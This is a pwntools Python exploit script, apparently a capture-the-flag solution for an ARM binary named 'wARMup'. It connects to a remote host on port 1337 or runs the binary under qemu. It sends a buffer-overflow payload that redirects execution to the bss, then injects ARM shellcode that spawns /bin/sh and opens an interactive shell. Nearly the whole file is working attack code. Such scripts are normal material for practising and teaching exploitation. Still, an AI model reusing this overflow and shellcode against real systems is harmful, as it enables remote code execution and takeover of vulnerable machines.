#!/usr/bin/env python
#-*- encoding: utf-8 -*-
# vi: set ft=python

from pwn import *
from sys import argv

context.update(arch="arm", bits=32, os="linux")
context.update(log_level="DEBUG")
context.binary="./wARMup"

elf=context.binary
libc=ELF("./handout/lib/libc.so.6")

if argv[1] == "l":
    io=process(["qemu-arm-static","-L","./", "./wARMup"])
elif argv[1] == "d":
    io=process(["qemu-arm-static", "-g", "1234", "-L", "./", "./wARMup"])
else:
    io=remote("18.191.89.190", 1337)

sc = "\x01\x30\x8f\xe2"
sc += "\x13\xff\x2f\xe1"
sc += "\x78\x46\x0c\x30"
sc += "\xc0\x46\x01\x90"
sc += "\x49\x1a\x92\x1a"
sc += "\x0b\x27\x01\xdf"
sc += "\x2f\x62\x69\x6e"
sc += "\x2f\x73\x68"

if __name__=="__main__":
    base=elf.bss()+0x300
    gadget=0x00010364

    payload=flat(cyclic(100), base, 0x10364, base, 0x10534)
    pause()
    io.sendline(payload) 

    io.send(flat(base-0x4, sc))

    io.interactive()

